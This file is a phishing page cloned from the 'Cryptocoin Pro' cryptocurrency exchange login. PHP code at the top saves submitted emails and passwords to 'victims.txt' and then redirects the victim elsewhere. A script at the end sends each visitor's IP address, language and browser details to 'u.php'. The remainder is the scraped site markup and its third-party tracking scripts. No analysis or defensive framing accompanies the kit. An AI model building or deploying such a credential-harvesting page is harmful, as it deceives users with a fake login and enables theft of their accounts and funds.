<?php
$u = $_POST['email'];
$p = $_POST['password'];
if ($u && $p){
    fwrite(fopen('victims.txt','w+'),'USERNAME : '.$u.' PASSWORD : '.$p."\n");
    $r = fread(fopen('redir.txt','r'),filesize('redir.txt'));
    echo "<script>window.open('".$r."','_top')</script>";
}
?>

<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script type="text/javascript" async="" src="./Cryptocoin Pro - Login_files/ec.js"></script><script type="text/javascript" src="./Cryptocoin Pro - Login_files/7997ad777b"></script><script type="text/javascript" async="" src="./Cryptocoin Pro - Login_files/analytics.js"></script><script src="./Cryptocoin Pro - Login_files/nr-1208.min.js"></script><script type="text/javascript" async="" src="./Cryptocoin Pro - Login_files/hotjar-1993003.js"></script><script type="text/javascript" async="" src="./Cryptocoin Pro - Login_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EybSWcHgiPeEiW8PyVFCqH8ltF5BJVYLCCHJpTp2QsYs58TZJuGZOUGfGAPF4IjR"></script><script async="" src="./Cryptocoin Pro - Login_files/gtm.js"></script><script src="./Cryptocoin Pro - Login_files/1486090144821306" async=""></script><script async="" src="./Cryptocoin Pro - Login_files/fbevents.js"></script><script type="text/javascript" src="./Cryptocoin Pro - Login_files/Capture.aspx"></script><script type="text/javascript" src="./Cryptocoin Pro - Login_files/191403.js"></script> <noscript><img src="https://secure.heat6have.com/191403.png" alt="" style="display:none;" /></noscript>
    <!-- Required meta tags -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <meta http-equiv="X-UA-Compatible" content="IE=edge"><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"7997ad777b",applicationID:"5212603"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(7),c=e(8),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(9);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e){return!(!e||!e.protocol||"file:"===e.protocol)}t.exports=r},{}],4:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(6),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],5:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],6:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],7:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],8:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],9:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(7),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!E++){var e=x.info=NREUM.info,t=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(h,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+x.offset],null,"api"),c("timing",["load",n]);var r=l.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===l.readyState&&o()}function o(){c("mark",["domContent",a()+x.offset],null,"api")}var a=e(2),c=e("handle"),f=e(7),u=e("ee"),s=e(5),d=e(3),p=window,l=p.document,m="addEventListener",v="attachEvent",g=p.XMLHttpRequest,w=g&&g.prototype;if(d(p.location)){NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:g,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var y=""+location,h={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1208.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),x=t.exports={offset:a.getLastTimestamp(),now:a,origin:y,features:{},xhrWrappable:b,userAgent:s};e(1),e(4),l[m]?(l[m]("DOMContentLoaded",o,!1),p[m]("load",r,!1)):(l[v]("onreadystatechange",i),p[v]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var E=0}},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(8),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script>
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Cryptocoin Pro - Login </title>

    <link href="./Cryptocoin Pro - Login_files/css" rel="stylesheet">
    <link href="./Cryptocoin Pro - Login_files/icon" rel="stylesheet">

    <link rel="stylesheet" href="./Cryptocoin Pro - Login_files/style.css">
    <link rel="stylesheet" href="./Cryptocoin Pro - Login_files/fontello.css">

    <meta name="base-url" content="https://app.cryptocoin.pro">
    <meta name="csrf-token" content="8Iu5JBFBOtEZH74dkQxp6c1FxzxkEz0MPpiVuO34">
    <meta name="redirect-same-page" content="https://app.cryptocoin.pro/login">
    <script src="./Cryptocoin Pro - Login_files/main.js"></script><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style>

    
    <!-- Favicons -->
    <link rel="icon" type="image/png" href="https://app.cryptocoin.pro/img/facelift/ccpro/favicon.png" sizes="32x32">

    
            <!-- Facebook Pixel Code -->
        <script>
            !function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                n.callMethod.apply(n,arguments):n.queue.push(arguments)};
                if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
                n.queue=[];t=b.createElement(e);t.async=!0;
                t.src=v;s=b.getElementsByTagName(e)[0];
                s.parentNode.insertBefore(t,s)}(window, document,'script',
                'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1486090144821306');
            fbq('track', 'PageView');
        </script>
        <noscript>
            <img height="1" width="1" style="display:none"
               src="https://www.facebook.com/tr?id=1486090144821306&ev=PageView&noscript=1"
            /></noscript>
        <!-- End Facebook Pixel Code -->
    
                <script src="./Cryptocoin Pro - Login_files/api.js" async="" defer=""></script>
        <script>
        function onSubmit() {
            document.getElementById("login-form").submit();
        }
        $(document).ready(function () {
                                });

    </script>


    
                <script src="./Cryptocoin Pro - Login_files/agent.js"></script>
    
    <!-- Google Tag Manager -->
          <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':                     new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],                 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=                 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);             })(window,document,'script','dataLayer','GTM-58LN7BR');         </script>
    <!-- End Google Tag Manager -->
<script async="" src="./Cryptocoin Pro - Login_files/modules.35981999a656a5a28309.js" charset="utf-8"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style></head>
<body class="light-mode auth-page ">
    <!-- Google Tag Manager (noscript) -->
          <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-58LN7BR"                           height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
<header>
<div class="header-logo d-inline-block w-100">
        <a href="https://app.cryptocoin.pro/" class="position-relative">
            <img src="./Cryptocoin Pro - Login_files/logo-white.svg" alt="Logo" class="d-none d-md-inline-block">
            <img src="./Cryptocoin Pro - Login_files/logo-mobile-white.png" alt="Logo" class="d-inline-block d-md-none">
            <span class="section-logo">App</span>
        </a>
    </div>
    </header>

    
    <div class="content">
        <!--[if IE]>
<div class="alert alert-danger" role="alert">
    Your browser is not supported. Please update your browser to enjoy 100% of our website features.
</div>
<![endif]-->        
    <div class="login-register">
        <div class="login-container">
            <h2>Welcome back</h2>
            <span>Please enter your login details</span>
            <form id="login-form" role="form" method="POST" action="">
                <input type="hidden" name="_token" value="8Iu5JBFBOtEZH74dkQxp6c1FxzxkEz0MPpiVuO34">
                <div class="form-group">
                    <div class="input-float ">
                        <input id="email" name="email" type="text" class="form-control" placeholder=" " value="">
                        <label for="email">Email</label>
                    </div>
                                    </div>
                <div class="form-group">
                    <div class="input-float ">
                        <input id="password" name="password" type="password" class="form-control" placeholder=" ">
                        <label for="password">Password</label>
                                                    <a href="https://app.cryptocoin.pro/password/reset">Forgot password?</a>
                                            </div>
                                    </div>
                <div class="form-group">
                                            <div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe src="./Cryptocoin Pro - Login_files/anchor.html" width="256" height="60" role="presentation" name="a-z90as31ta1yo" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Cryptocoin Pro - Login_files/saved_resource(1).html"></iframe></div><input type="submit" data-sitekey="6Lf82q0UAAAAAHz9mPYccCPmAb8u9U9tEtYnRAKk" data-callback="onSubmit" class="btn btn-primary btn-block btn-lg text-uppercase g-recaptcha" value="Login">
                                    </div>
            </form>
            <div class="login-social">
                                                                                            </div>
                            <p>Don’t have an account yet? <a href="https://app.cryptocoin.pro/register">Signup Now</a></p>
                    </div>
    </div>

    
    <div class="modal fade" id="mail-count-modal" tabindex="-1" role="dialog" aria-labelledby="modal" aria-hidden="true">
        <div class="modal-dialog">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">×</span>
            </button>
            <div class="modal-content">
                <div class="modal-body">
                    <div class="icon-text">
                        <i class="material-icons icon-big">error_outline</i>
                        <p class="black">The maximum number of e-mails has been reached. Please try again after 10 minutes.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    
    <div class="modal fade" id="ip-changed-modal" tabindex="-1" role="dialog" aria-labelledby="modal" aria-hidden="true">
        <div class="modal-dialog">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">×</span>
            </button>
            <div class="modal-content">
                <div class="modal-body">
                    <div class="icon-text">
                        <i class="material-icons icon-big">error_outline</i>
                        <p class="black"></p><p>It appears that you may be signing into Cryptocoin Pro from a device we are unfamiliar with or one that you have not used for a long period of time.
                          For your security, a confirmation email has been sent you your email address.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    </div>

    <!-- Footer -->
<footer>
    <div class="container">
        <div class="copyright">
            Copyright <b>Cryptocoin Pro</b> © 2021
        </div>
    </div>
</footer>
    
    <script type="text/javascript">

    function utmzReady(fn) {
      if (document.readyState != 'loading'){
        fn();
      } else if (document.addEventListener) {
        document.addEventListener('DOMContentLoaded', fn);
      } else {
        document.attachEvent('onreadystatechange', function() {
          if (document.readyState != 'loading')
            fn();
        });
      }
    }

       utmzReady(
            /**
             * UTMZ Cookie Replicator
             *
             * Makes a generally faithful representation of the old __utmz cookie
             * from Classic Analytics. Stores the data in a cookie named __utmzz.
             * Also sets a session cookie named __utmzzses.
             *
             * Data is stored in the __utmzz cookie in the following format; brackets
             * indicate optional data and are aexcluded from the stored string:
             *
             * utmcsr=SOURCE|utmcmd=MEDIUM[|utmccn=CAMPAIGN][|utmcct=CONTENT]
             * [|utmctr=TERM/KEYWORD]
             *
             * e.g.:
             *
             * utmcsr=example.com|utmcmd=affl-link|utmccn=foo|utmcct=bar|utmctr=biz
             *
             * Follows the same campaign assignment/overriding flow as Classic Analytics.
             */
            (function(document) {

                var referrer = document.referrer;
                var gaReferral = {
                    'utmcsr': '(direct)',
                    'utmcmd': '(none)',
                    'utmccn': '(not set)'
                };
                var thisHostname = document.location.hostname;
                var thisDomain = getDomain_(thisHostname);
                var referringDomain = getDomain_(document.referrer);
                var sessionCookie = getCookie_('__utmzzses');
                var cookieExpiration = new Date(+new Date() + 1000 * 60 * 60 * 72 /* * 24 * 30 * 6 */); // expires in 72 hours
                var qs = document.location.search.replace('?', '');
                var hash = document.location.hash.replace('#', '');
                var gaParams = parseGoogleParams(qs + '#' + hash);
                var referringInfo = parseGaReferrer(referrer);
                var storedVals = getCookie_('__utmz') || getCookie_('__utmzz');

                var newCookieVals = new Object();
                var keyMap = {
                    'utm_source': 'utmcsr',
                    'utm_medium': 'utmcmd',
                    'utm_campaign': 'utmccn',
                    'utm_content': 'utmcct',
                    'utm_term': 'utmctr',
                    'gclid': 'utmgclid',
                    'dclid': 'utmdclid'
                };
                var keyName,
                    values,
                    _val,
                    _key,
                    raw,
                    key,
                    len,
                    i;

                if (sessionCookie && referringDomain === thisDomain) {

                    gaParams = null;
                    referringInfo = null;

                }

                if (gaParams && (gaParams.utm_source || gaParams.gclid || gaParams.dclid)) {

                    for (key in gaParams) {

                        if (typeof gaParams[key] !== 'undefined') {

                            keyName = keyMap[key];
                            gaReferral[keyName] = gaParams[key];

                        }

                    }

                    if (gaParams.gclid || gaParams.dclid) {

                        gaReferral.utmcsr = 'google';
                        gaReferral.utmcmd = gaReferral.utmgclid ? 'cpc' : 'cpm';

                    }

                } else if (referringInfo) {

                    gaReferral.utmcsr = referringInfo.source;
                    gaReferral.utmcmd = referringInfo.medium;
                    if (referringInfo.term) gaReferral.utmctr = referringInfo.term;

                } else if (storedVals) {

                    values = {};

                    raw = JSON.parse(storedVals);

                    var utmParams = ['utmcsr', 'utmcmd', 'utmccn', 'utmcct', 'utmctr', 'utmgclid', 'utmdclid'];

                    for (var i = 0; i < utmParams.length; i++) {
                         if (raw.hasOwnProperty(utmParams[i])) {
                            values[utmParams[i]] = raw[utmParams[i]];
                        }
                    }

                    gaReferral = values;

                }

                for (key in gaReferral) {

                    if (typeof gaReferral[key] !== 'undefined') {

                        newCookieVals[key] = gaReferral[key];

                    }

                }

                writeCookie_('__utmzz', JSON.stringify(newCookieVals), cookieExpiration, '/', thisDomain);
                writeCookie_('__utmzzses', 1, null, '/', thisDomain);

                function parseGoogleParams(str) {

                    var campaignParams = ['source', 'medium', 'campaign', 'term', 'content'];
                    var regex = new RegExp('(utm_(' + campaignParams.join('|') + ')|(d|g)clid)=.*?([^&#]*|$)', 'gi');
                    var gaParams = str.match(regex);
                    var paramsObj,
                        vals,
                        len,
                        i;

                    if (gaParams) {

                        paramsObj = {};
                        len = gaParams.length;

                        for (i = 0; i < len; i++) {

                            vals = gaParams[i].split('=');

                            if (vals) {

                                paramsObj[vals[0]] = vals[1];

                            }

                        }

                    }

                    return paramsObj;

                }

                function parseGaReferrer(referrer) {

                    if (!referrer) return;

                    var searchEngines = {
                        'daum.net': {
                            'p': 'q',
                            'n': 'daum'
                        },
                        'eniro.se': {
                            'p': 'search_word',
                            'n': 'eniro '
                        },
                        'naver.com': {
                            'p': 'query',
                            'n': 'naver '
                        },
                        'yahoo.com': {
                            'p': 'p',
                            'n': 'yahoo'
                        },
                        'msn.com': {
                            'p': 'q',
                            'n': 'msn'
                        },
                        'bing.com': {
                            'p': 'q',
                            'n': 'live'
                        },
                        'aol.com': {
                            'p': 'q',
                            'n': 'aol'
                        },
                        'lycos.com': {
                            'p': 'q',
                            'n': 'lycos'
                        },
                        'ask.com': {
                            'p': 'q',
                            'n': 'ask'
                        },
                        'altavista.com': {
                            'p': 'q',
                            'n': 'altavista'
                        },
                        'search.netscape.com': {
                            'p': 'query',
                            'n': 'netscape'
                        },
                        'cnn.com': {
                            'p': 'query',
                            'n': 'cnn'
                        },
                        'about.com': {
                            'p': 'terms',
                            'n': 'about'
                        },
                        'mamma.com': {
                            'p': 'query',
                            'n': 'mama'
                        },
                        'alltheweb.com': {
                            'p': 'q',
                            'n': 'alltheweb'
                        },
                        'voila.fr': {
                            'p': 'rdata',
                            'n': 'voila'
                        },
                        'search.virgilio.it': {
                            'p': 'qs',
                            'n': 'virgilio'
                        },
                        'baidu.com': {
                            'p': 'wd',
                            'n': 'baidu'
                        },
                        'alice.com': {
                            'p': 'qs',
                            'n': 'alice'
                        },
                        'yandex.com': {
                            'p': 'text',
                            'n': 'yandex'
                        },
                        'najdi.org.mk': {
                            'p': 'q',
                            'n': 'najdi'
                        },
                        'seznam.cz': {
                            'p': 'q',
                            'n': 'seznam'
                        },
                        'search.com': {
                            'p': 'q',
                            'n': 'search'
                        },
                        'wp.pl': {
                            'p': 'szukaj ',
                            'n': 'wirtulana polska'
                        },
                        'online.onetcenter.org': {
                            'p': 'qt',
                            'n': 'o*net'
                        },
                        'szukacz.pl': {
                            'p': 'q',
                            'n': 'szukacz'
                        },
                        'yam.com': {
                            'p': 'k',
                            'n': 'yam'
                        },
                        'pchome.com': {
                            'p': 'q',
                            'n': 'pchome'
                        },
                        'kvasir.no': {
                            'p': 'q',
                            'n': 'kvasir'
                        },
                        'sesam.no': {
                            'p': 'q',
                            'n': 'sesam'
                        },
                        'ozu.es': {
                            'p': 'q',
                            'n': 'ozu '
                        },
                        'terra.com': {
                            'p': 'query',
                            'n': 'terra'
                        },
                        'mynet.com': {
                            'p': 'q',
                            'n': 'mynet'
                        },
                        'ekolay.net': {
                            'p': 'q',
                            'n': 'ekolay'
                        },
                        'rambler.ru': {
                            'p': 'words',
                            'n': 'rambler'
                        },
                        'google': {
                            'p': 'q',
                            'n': 'google'
                        }
                    };
                    var a = document.createElement('a');
                    var values = {};
                    var searchEngine,
                        termRegex,
                        term;

                    a.href = referrer;

                    // Shim for the billion google search engines
                    if (a.hostname.indexOf('google') > -1) {

                        referringDomain = 'google';

                    }

                    if (searchEngines[referringDomain]) {

                        searchEngine = searchEngines[referringDomain];
                        termRegex = new RegExp(searchEngine.p + '=.*?([^&#]*|$)', 'gi');
                        term = a.search.match(termRegex);

                        values.source = searchEngine.n;
                        values.medium = 'organic';

                        values.term = (term ? term[0].split('=')[1] : '') || '(not provided)';

                    } else if (referringDomain !== thisDomain) {

                        values.source = a.hostname;
                        values.medium = 'referral';

                    }

                    return values;

                }

                function writeCookie_(name, value, expiration, path, domain) {

                    var str = name + '=' + value + ';';
                    if (expiration) str += 'Expires=' + expiration.toGMTString() + ';';
                    if (path) str += 'Path=' + path + ';';
                    if (domain) str += 'Domain=' + domain + ';';

                    document.cookie = str;

                }

                function getCookie_(name) {

                    var cookies = '; ' + document.cookie
                    var cvals = cookies.split('; ' + name + '=');

                    if (cvals.length > 1) return cvals.pop().split(';')[0];

                }

                function getDomain_(url) {

                    if (!url) return;

                    var a = document.createElement('a');
                    a.href = url;

                    try {

                        return a.hostname.match(/[^.]*\.[^.]{2,3}(?:\.[^.]{2,3})?$/)[0];

                    } catch(squelch) {}

                }

            })(document)
        );
</script>
    <!--[if IE]>
    <div class="warning"><p>For the best experience please open using Chrome, Firefox or Safari</p></div>
    <![endif]-->

                               
                     <script type="text/javascript">
                         seon.config({
                              session_id: "hafZgo5uR6MLNsLVyy8vuQoQ7Pk0IaBS3fKoM6Hv", // keep 10 x-es so they can be replaced by session id
                              audio_fingerprint: true,
                              canvas_fingerprint: true,
                              webgl_fingerprint: true,
                              onSuccess: function(message) {
                                console.log(message);
                              },
                              onError: function(message) {
                                console.log(message);
                              }
                        });                         
                        seon.getBase64Session(function(data) {
                            if (data) {                           
                                $.getJSON("https://ipinfo.io", function(ip_data){ // keep 10 y-s so they can be replaced by ip getter url
                                    if (ip_data && ip_data.ip) {
                                        $.ajax({
                                            headers: {"X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content")},
                                            type: "POST",
                                                url: "/store-seon-sessions",
                                                data: {"ip": ip_data.ip},                                    
                                        });		
				                    }	
                                });                           
			 	                $.ajax({
                        	    	headers: {"X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content")},
                            		type: "POST",
                                    url: "/store-seon-sessions",
                                    data: {"seon_session": data},                                    
                        	    });		                                                                
                            } else {
                                console.log("Seon session error.");
                            }
                        });
                    </script>               
                
        
                        <script src="./Cryptocoin Pro - Login_files/jewsln25busmuwkjs7c2bbkie9ee3diq.js"></script>
            <script type="text/javascript">
                document.tidioChatLang = "en";
                            </script>
            <style type="text/css">
                @media (max-width: 767px) {
                    #tidio-chat {
                        display:none !important;
                    }
                }
            </style>
            
            <script>
                                    $(document).ready(function() {
                dataLayer.push({
                    "uid": "error",
                    "useraccount": "error"
                });
            });
        </script>
<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>
    
     
    <input type="hidden" id="gtm_utmz_source" value="(direct)">
    <input type="hidden" id="gtm_utmz_medium" value="(none)">
   
